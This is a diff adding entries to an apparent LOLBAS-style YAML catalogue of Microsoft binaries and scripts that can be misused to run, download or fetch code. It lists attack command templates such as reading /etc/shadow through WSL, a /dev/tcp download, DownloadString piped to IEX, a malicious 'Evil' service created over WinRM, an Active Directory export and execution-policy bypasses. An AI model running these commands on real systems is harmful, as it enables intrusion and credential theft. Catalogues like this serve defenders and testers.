+  - '{''Path'': ''C:\\Program Files (x86)\\IIS\\Microsoft Web Deploy V4\\msdeploy.exe''}'
+  attack: []
+- binary: MsoHtmEd.exe
+  description: Microsoft Office component
+  commands:
+  - MsoHtmEd.exe {REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\MSOHTMED.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\MSOHTMED.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office\\Office16\\MSOHTMED.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office\\Office16\\MSOHTMED.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\MSOHTMED.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\MSOHTMED.exe''}'
+  attack: []
+- binary: Mspub.exe
+  description: Microsoft Publisher
+  commands:
+  - mspub.exe {REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\MSPUB.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\MSPUB.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office\\Office16\\MSPUB.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office\\Office16\\MSPUB.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\MSPUB.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\MSPUB.exe''}'
+  attack: []
+- binary: msxsl.exe
+  description: Command line utility used to perform XSL transformations.
+  commands:
+  - msxsl.exe {PATH:.xml} {PATH:.xsl}
+  - msxsl.exe {PATH:.xml} {PATH:.xsl}
+  - msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl}
+  - msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml}
+  - msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}
+  - msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name
+  paths:
+  - '{''Path'': ''no default''}'
+  attack: []
+- binary: Nmcap.exe
+  description: Command-line packet capture utility from Microsoft Network Monitor 3.x.
+  commands:
+  - nmcap.exe /network * /capture /file {PATH_ABSOLUTE:.cap}
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Microsoft Network Monitor 3\\nmcap.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Network Monitor 3\\nmcap.exe''}'
+  attack: []
+- binary: ntdsutil.exe
+  description: Command line utility used to export Active Directory.
+  commands:
+  - ntdsutil.exe "ac i ntds" "ifm" "create full c:\" q q
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\ntdsutil.exe''}'
+  attack: []
+- binary: Ntsd.exe
+  description: Symbolic Debugger for Windows.
+  commands:
+  - ntsd.exe -g {CMD}
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\ntsd.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\ntsd.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\arm\\ntsd.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\arm64\\ntsd.exe''}'
+  attack: []
+- binary: OpenConsole.exe
+  description: Console Window host for Windows Terminal
+  commands:
+  - OpenConsole.exe {PATH:.exe}
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\Terminal\\ServiceHub\\os64\\OpenConsole.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\Terminal\\ServiceHub\\os86\\OpenConsole.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\Terminal\\ServiceHub\\os64\\OpenConsole.exe''}'
+  - '{''Path'': ''C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\\OpenConsole.exe''}'
+  attack: []
+- binary: Outlook.exe
+  description: Microsoft Office component
+  commands:
+  - Outlook.exe {REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\Outlook.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\Outlook.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office\\Office16\\Outlook.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office\\Office16\\Outlook.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\Outlook.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\Outlook.exe''}'
+  attack: []
+- binary: Pixtool.exe
+  description: Command line utility for taking and analyzing PIX GPU captures.
+  commands:
+  - pixtool.exe launch {PATH_ABSOLUTE:.exe}
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Microsoft PIX\\pixtool.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft PIX\\pixtool.exe''}'
+  attack: []
+- binary: Powerpnt.exe
+  description: Microsoft Office binary.
+  commands:
+  - Powerpnt.exe {REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\Powerpnt.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\Powerpnt.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office\\Office16\\Powerpnt.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office\\Office16\\Powerpnt.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\Powerpnt.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\Powerpnt.exe''}'
+  attack: []
+- binary: Procdump.exe
+  description: SysInternals Memory Dump Tool
+  commands:
+  - procdump.exe -md {PATH:.dll} explorer.exe
+  - procdump.exe -md {PATH:.dll} foobar
+  paths:
+  - '{''Path'': ''no default''}'
+  attack: []
+- binary: ProtocolHandler.exe
+  description: Microsoft Office binary
+  commands:
+  - ProtocolHandler.exe {REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\ProtocolHandler.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\ProtocolHandler.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office\\Office16\\ProtocolHandler.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office\\Office16\\ProtocolHandler.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\ProtocolHandler.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\ProtocolHandler.exe''}'
+  attack: []
+- binary: rcsi.exe
+  description: Non-Interactive command line inerface included with Visual Studio.
+  commands:
+  - rcsi.exe {PATH:.csx}
+  - rcsi.exe {PATH:.csx}
+  paths:
+  - '{''Path'': ''no default''}'
+  attack: []
+- binary: Remote.exe
+  description: Debugging tool included with Windows Debugging Tools
+  commands:
+  - Remote.exe /s {PATH:.exe} anythinghere
+  - Remote.exe /s {PATH:.exe} anythinghere
+  - Remote.exe /s {PATH_SMB:.exe} anythinghere
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\remote.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\remote.exe''}'
+  attack: []
+- binary: Sqldumper.exe
+  description: Debugging utility included with Microsoft SQL.
+  commands:
+  - sqldumper.exe 464 0 0x0110
+  - sqldumper.exe 540 0 0x01100:40
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Microsoft SQL Server\\90\\Shared\\SQLDumper.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office\\root\\vfs\\ProgramFilesX86\\Microsoft Analysis\\AS OLEDB\\140\\SQLDumper.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Power BI Desktop\\bin\\SqlDumper.exe''}'
+  attack: []
+- binary: Sqlps.exe
+  description: Tool included with Microsoft SQL Server that loads SQL Server cmdlets. Microsoft SQL Server\100 and 110 are Powershell v2. Microsoft SQL Server\120 and 130 are Powershell version 4. Replaced by SQLToolsPS.exe in SQL Server 2016, but will be included with installation for compatability reasons.
+  commands:
+  - Sqlps.exe -noprofile
+  paths:
+  - '{''Path'': ''C:\\Program files (x86)\\Microsoft SQL Server\\100\\Tools\\Binn\\sqlps.exe''}'
+  - '{''Path'': ''C:\\Program files (x86)\\Microsoft SQL Server\\110\\Tools\\Binn\\sqlps.exe''}'
+  - '{''Path'': ''C:\\Program files (x86)\\Microsoft SQL Server\\120\\Tools\\Binn\\sqlps.exe''}'
+  - '{''Path'': ''C:\\Program files (x86)\\Microsoft SQL Server\\130\\Tools\\Binn\\sqlps.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft SQL Server\\150\\Tools\\Binn\\SQLPS.exe''}'
+  attack: []
+- binary: SQLToolsPS.exe
+  description: Tool included with Microsoft SQL that loads SQL Server cmdlts. A replacement for sqlps.exe. Successor to sqlps.exe in SQL Server 2016+.
+  commands:
+  - SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe}
+  paths:
+  - '{''Path'': ''C:\\Program files (x86)\\Microsoft SQL Server\\130\\Tools\\Binn\\sqlps.exe''}'
+  attack: []
+- binary: Squirrel.exe
+  description: Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.
+  commands:
+  - squirrel.exe --download {REMOTEURL}
+  - squirrel.exe --update {REMOTEURL}
+  - squirrel.exe --update {REMOTEURL}
+  - squirrel.exe --updateRollback={REMOTEURL}
+  - squirrel.exe --updateRollback={REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Teams\\current\\Squirrel.exe''}'
+  attack: []
+- binary: te.exe
+  description: Testing tool included with Microsoft Test Authoring and Execution Framework (TAEF).
+  commands:
+  - te.exe {PATH:.wsc}
+  - te.exe {PATH:.dll}
+  paths:
+  - '{''Path'': ''no default''}'
+  attack: []
+- binary: Teams.exe
+  description: Electron runtime binary which runs the Teams application
+  commands:
+  - teams.exe
+  - teams.exe
+  - teams.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
+  paths:
+  - '{''Path'': ''C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe''}'
+  attack: []
+- binary: TestWindowRemoteAgent.exe
+  description: TestWindowRemoteAgent.exe is the command-line tool to establish RPC
+  commands:
+  - TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TestWindow\\RemoteAgent\\TestWindowRemoteAgent.exe''}'
+  attack: []
+- binary: Tracker.exe
+  description: Tool included with Microsoft .Net Framework.
+  commands:
+  - Tracker.exe /d {PATH:.dll} /c C:\Windows\write.exe
+  - Tracker.exe /d {PATH:.dll} /c C:\Windows\write.exe
+  paths:
+  - '{''Path'': ''no default''}'
+  attack: []
+- binary: Update.exe
+  description: Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.
+  commands:
+  - Update.exe --download {REMOTEURL}
+  - Update.exe --update={REMOTEURL}
+  - Update.exe --update={REMOTEURL}
+  - Update.exe --update={PATH_SMB:folder}
+  - Update.exe --update={PATH_SMB:folder}
+  - Update.exe --updateRollback={REMOTEURL}
+  - Update.exe --updateRollback={REMOTEURL}
+  - Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}"
+  - Update.exe --updateRollback={PATH_SMB:folder}
+  - Update.exe --updateRollback={PATH_SMB:folder}
+  - Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}"
+  - Update.exe --createShortcut={PATH:.exe} -l=Startup
+  paths:
+  - '{''Path'': ''C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Teams\\update.exe''}'
+  attack: []
+- binary: VSDiagnostics.exe
+  description: Command-line tool used for performing diagnostics.
+  commands:
+  - VSDiagnostics.exe start 1 /launch:{PATH:.exe}
+  - VSDiagnostics.exe start 2 /launch:{PATH:.exe} /launchArgs:"{CMD:args}"
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe''}'
+  attack: []
+- binary: VSIISExeLauncher.exe
+  description: Binary will execute specified binary. Part of VS/VScode installation.
+  commands:
+  - VSIISExeLauncher.exe -p {PATH:.exe} -a "{CMD:args}"
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Common7\\IDE\\Extensions\\Microsoft\\Web Tools\\ProjectSystem\\VSIISExeLauncher.exe''}'
+  attack: []
+- binary: Visio.exe
+  description: Microsoft Visio Executable
+  commands:
+  - Visio.exe {REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office\\Office14\\Visio.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office\\Office14\\Visio.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office\\Office15\\Visio.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office\\Office15\\Visio.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office\\Office16\\Visio.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office\\Office16\\Visio.exe''}'
+  attack: []
+- binary: VisualUiaVerifyNative.exe
+  description: A Windows SDK binary for manual and automated testing of Microsoft UI Automation implementation and controls.
+  commands:
+  - VisualUiaVerifyNative.exe
+  paths:
+  - '{''Path'': ''c:\\Program Files (x86)\\Windows Kits\\10\\bin\\<version>\\arm64\\UIAVerify\\VisualUiaVerifyNative.exe''}'
+  - '{''Path'': ''c:\\Program Files (x86)\\Windows Kits\\10\\bin\\<version>\\x64\\UIAVerify\\VisualUiaVerifyNative.exe''}'
+  - '{''Path'': ''c:\\Program Files (x86)\\Windows Kits\\10\\bin\\<version>\\UIAVerify\\VisualUiaVerifyNative.exe''}'
+  attack: []
+- binary: VSLaunchBrowser.exe
+  description: Microsoft Visual Studio browser launcher tool for web applications debugging
+  commands:
+  - VSLaunchBrowser.exe .exe {REMOTEURL:.exe}
+  - VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe}
+  - VSLaunchBrowser.exe .exe {PATH_SMB}
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Microsoft Visual Studio\\<version>\\Community\\Common7\\IDE\\VSLaunchBrowser.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Visual Studio\\<version>\\Community\\Common7\\IDE\\VSLaunchBrowser.exe''}'
+  attack: []
+- binary: Vshadow.exe
+  description: VShadow is a command-line tool that can be used to create and manage volume shadow copies.
+  commands:
+  - 'vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:'
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\bin\\<version>\\x64\\vshadow.exe''}'
+  attack: []
+- binary: vsjitdebugger.exe
+  description: Just-In-Time (JIT) debugger included with Visual Studio
+  commands:
+  - Vsjitdebugger.exe {PATH:.exe}
+  paths:
+  - '{''Path'': ''c:\\windows\\system32\\vsjitdebugger.exe''}'
+  attack: []
+- binary: WFMFormat.exe
+  description: Command-line tool used for pretty-print a dump file generated by Message Farm Analyzer tool.
+  commands:
+  - WFMFormat.exe
+  paths:
+  - '{''Path'': ''C:\\there\\is\\no\\default\\installation\\path\\WFMFormat.exe''}'
+  attack: []
+- binary: Wfc.exe
+  description: The Workflow Command-line Compiler tool is included with the Windows Software Development Kit (SDK).
+  commands:
+  - wfc.exe {PATH_ABSOLUTE:.xoml}
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\v10.0A\\bin\\NETFX 4.8 Tools\\wfc.exe''}'
+  attack: []
+- binary: WinDbg.exe
+  description: Windows Debugger for advanced user-mode and kernel-mode debugging.
+  commands:
+  - windbg.exe -g {CMD}
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\windbg.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\windbg.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\arm\\windbg.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\arm64\\windbg.exe''}'
+  attack: []
+- binary: WinProj.exe
+  description: Microsoft Project Executable
+  commands:
+  - WinProj.exe {REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office\\Office14\\WinProj.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office\\Office14\\WinProj.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office\\Office15\\WinProj.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office\\Office15\\WinProj.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office\\Office16\\WinProj.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office\\Office16\\WinProj.exe''}'
+  attack: []
+- binary: Winword.exe
+  description: Microsoft Office binary
+  commands:
+  - winword.exe {REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office\\root\\Office16\\winword.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\winword.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\winword.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office\\Office16\\winword.exe''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Office\\Office16\\winword.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\winword.exe''}'
+  attack: []
+- binary: wsb.exe
+  description: Windows Sandbox command-line interface. Creates, lists, controls, and executes commands inside Windows Sandbox sessions from the host CLI.
+  commands:
+  - 'wsb start --config "<Configuration><LogonCommand><Command>{CMD}</Command></LogonCommand></Configuration>"
+
+    wsb exec -r System --id YOUR_ID'
+  - 'wsb start --config "<Configuration><MappedFolders><MappedFolder><HostFolder>{PATH_ABSOLUTE:folder}</HostFolder><ReadOnly>false</ReadOnly></MappedFolder></MappedFolders></Configuration>"
+
+    wsb exec -r System --id YOUR_ID -c "cmd.exe /c copy C:\users\WDAGUtilityAccount\Desktop\Temp\{PATH} {PATH}"'
+  - 'wsb start
+
+    wsb share --id YOUR_ID -f {PATH_ABSOLUTE:folder} -s c:\SOME_FOLDER --allow-write
+
+    wsb exec -r System --id YOUR_ID -c "cmd.exe /c copy {PATH_ABSOLUTE} c:\SOME_FOLDER"'
+  paths:
+  - '{''Path'': ''C:\\Users\\<user>\\AppData\\Local\\Microsoft\\WindowsApps\\wsb.exe''}'
+  attack: []
+- binary: Wsl.exe
+  description: Windows subsystem for Linux executable
+  commands:
+  - wsl.exe -e /mnt/c/Windows/System32/calc.exe
+  - wsl.exe -u root -e cat /etc/shadow
+  - wsl.exe --exec bash -c "{CMD}"
+  - wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
+  - wsl.exe
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\wsl.exe''}'
+  attack: []
+- binary: XBootMgr.exe
+  description: Windows Performance Toolkit binary used to start performance traces.
+  commands:
+  - xbootmgr.exe -trace "{boot|hibernate|standby|shutdown|rebootCycle}" -callBack {PATH:.exe}
+  - xbootmgr.exe -trace "{boot|hibernate|standby|shutdown|rebootCycle}" -preTraceCmd {PATH:.exe}
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Windows Kits\\10\\Windows Performance Toolkit\\xbootmgr.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\Windows Performance Toolkit\\xbootmgr.exe''}'
+  attack: []
+- binary: XBootMgrSleep.exe
+  description: Windows Performance Toolkit binary used for tracing and analyzing system performance during sleep and resume transitions.
+  commands:
+  - xbootmgrsleep.exe 1000 {PATH:.exe}
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Windows Kits\\10\\Windows Performance Toolkit\\xbootmgrsleep.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Windows Kits\\10\\Windows Performance Toolkit\\xbootmgrsleep.exe''}'
+  attack: []
+- binary: devtunnel.exe
+  description: Binary to enable forwarded ports on windows operating systems.
+  commands:
+  - devtunnel.exe host -p 8080
+  paths:
+  - '{''Path'': ''C:\\Users\\<username>\\AppData\\Local\\Temp\\.net\\devtunnel\\devtunnel.exe''}'
+  - '{''Path'': ''C:\\Users\\<username>\\AppData\\Local\\Temp\\DevTunnels\\devtunnel.exe''}'
+  attack: []
+- binary: dotnet-counters.exe
+  description: .NET diagnostic tool for monitoring performance counters of .NET applications in real-time. Installed via 'dotnet tool install --global dotnet-counters' (.NET SDK required).
+  commands:
+  - dotnet-counters.exe collect --duration 1 -- {PATH:.exe}
+  paths:
+  - '{''Path'': ''C:\\Users\\<user>\\.dotnet\\tools\\dotnet-counters.exe''}'
+  attack: []
+- binary: dotnet-trace.exe
+  description: .NET diagnostic tool for collecting runtime traces from .NET applications. Installed via 'dotnet tool install --global dotnet-trace' (.NET SDK required).
+  commands:
+  - dotnet-trace.exe collect --duration 00:00:01 -- {PATH:.exe}
+  paths:
+  - '{''Path'': ''C:\\Users\\<user>\\.dotnet\\tools\\dotnet-trace.exe''}'
+  attack: []
+- binary: vsls-agent.exe
+  description: Agent for Visual Studio Live Share (Code Collaboration)
+  commands:
+  - vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll}
+  paths:
+  - '{''Path'': ''c:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\Common7\\IDE\\Extensions\\Microsoft\\LiveShare\\Agent\\vsls-agent.exe''}'
+  attack: []
+- binary: vstest.console.exe
+  description: VSTest.Console.exe is the command-line tool to run tests
+  commands:
+  - vstest.console.exe {PATH:.dll}
+  paths:
+  - '{''Path'': ''C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TestWindow\\vstest.console.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\TestAgent\\Common7\\IDE\\CommonExtensions\\Microsoft\\TestWindow\\vstest.console.exe''}'
+  attack: []
+- binary: winfile.exe
+  description: Windows File Manager executable
+  commands:
+  - winfile.exe {PATH:.exe}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\winfile.exe''}'
+  - '{''Path'': ''C:\\Windows\\winfile.exe''}'
+  - '{''Path'': ''C:\\Program Files\\WinFile\\winfile.exe''}'
+  - '{''Path'': ''C:\\Program Files (x86)\\WinFile\\winfile.exe''}'
+  - '{''Path'': ''C:\\Program Files\\WindowsApps\\Microsoft.WindowsFileManager_10.3.0.0_x64__8wekyb3d8bbwe\\WinFile\\winfile.exe''}'
+  attack: []
+- binary: xsd.exe
+  description: XML Schema Definition Tool included with the Windows Software Development Kit (SDK).
+  commands:
+  - xsd.exe {REMOTEURL}
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\<version>\\bin\\NETFX <version> Tools\\xsd.exe''}'
+  attack: []
+- binary: CL_LoadAssembly.ps1
+  description: PowerShell Diagnostic Script
+  commands:
+  - powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\..\..\..\testing\fun.dll;[Program]::Fun()"
+  paths:
+  - '{''Path'': ''C:\\Windows\\diagnostics\\system\\Audio\\CL_LoadAssembly.ps1''}'
+  attack: []
+- binary: CL_Mutexverifiers.ps1
+  description: Proxy execution with CL_Mutexverifiers.ps1
+  commands:
+  - . C:\Windows\diagnostics\system\AERO\CL_Mutexverifiers.ps1   \nrunAfterCancelProcess {PATH:.ps1}
+  paths:
+  - '{''Path'': ''C:\\Windows\\diagnostics\\system\\WindowsUpdate\\CL_Mutexverifiers.ps1''}'
+  - '{''Path'': ''C:\\Windows\\diagnostics\\system\\Audio\\CL_Mutexverifiers.ps1''}'
+  - '{''Path'': ''C:\\Windows\\diagnostics\\system\\WindowsUpdate\\CL_Mutexverifiers.ps1''}'
+  - '{''Path'': ''C:\\Windows\\diagnostics\\system\\Video\\CL_Mutexverifiers.ps1''}'
+  - '{''Path'': ''C:\\Windows\\diagnostics\\system\\Speech\\CL_Mutexverifiers.ps1''}'
+  attack: []
+- binary: CL_Invocation.ps1
+  description: Aero diagnostics script
+  commands:
+  - . C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1   \nSyncInvoke {CMD}
+  paths:
+  - '{''Path'': ''C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1''}'
+  - '{''Path'': ''C:\\Windows\\diagnostics\\system\\Audio\\CL_Invocation.ps1''}'
+  - '{''Path'': ''C:\\Windows\\diagnostics\\system\\WindowsUpdate\\CL_Invocation.ps1''}'
+  attack: []
+- binary: Launch-VsDevShell.ps1
+  description: Locates and imports a Developer PowerShell module and calls the Enter-VsDevShell cmdlet
+  commands:
+  - powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe}
+  - powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsInstallationPath "/../../../../../; {PATH:.exe} ;"
+  paths:
+  - '{''Path'': ''C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Common7\\Tools\\Launch-VsDevShell.ps1''}'
+  - '{''Path'': ''C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\Tools\\Launch-VsDevShell.ps1''}'
+  attack: []
+- binary: Manage-bde.wsf
+  description: Script for managing BitLocker
+  commands:
+  - set comspec={PATH_ABSOLUTE:.exe} & cscript c:\windows\system32\manage-bde.wsf
+  - copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\manage-bde.wsf''}'
+  attack: []
+- binary: Pubprn.vbs
+  description: Proxy execution with Pubprn.vbs
+  commands:
+  - pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\Printing_Admin_Scripts\\en-US\\pubprn.vbs''}'
+  attack: []
+- binary: Syncappvpublishingserver.vbs
+  description: Script used related to app-v and publishing server
+  commands:
+  - SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\SyncAppvPublishingServer.vbs''}'
+  attack: []
+- binary: UtilityFunctions.ps1
+  description: PowerShell Diagnostic Script
+  commands:
+  - powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()"
+  paths:
+  - '{''Path'': ''C:\\Windows\\diagnostics\\system\\Networking\\UtilityFunctions.ps1''}'
+  attack: []
+- binary: winrm.vbs
+  description: Script used for manage Windows RM settings
+  commands:
+  - winrm invoke Create wmicimv2/Win32_Process @{CommandLine="{CMD}"} -r:http://target:5985
+  - winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="{CMD}"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985
+  - '%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty'
+  paths:
+  - '{''Path'': ''C:\\Windows\\System32\\winrm.vbs''}'
+  - '{''Path'': ''C:\\Windows\\SysWOW64\\winrm.vbs''}'
+  attack: []
+- binary: Pester.bat
+  description: Used as part of the Powershell pester
+  commands:
+  - Pester.bat [/help|?|-?|/?] "$null; {CMD}"
+  - Pester.bat ;{PATH:.exe}
+  paths:
+  - '{''Path'': ''c:\\Program Files\\WindowsPowerShell\\Modules\\Pester\\<VERSION>\\bin\\Pester.bat''}'
+  attack: []
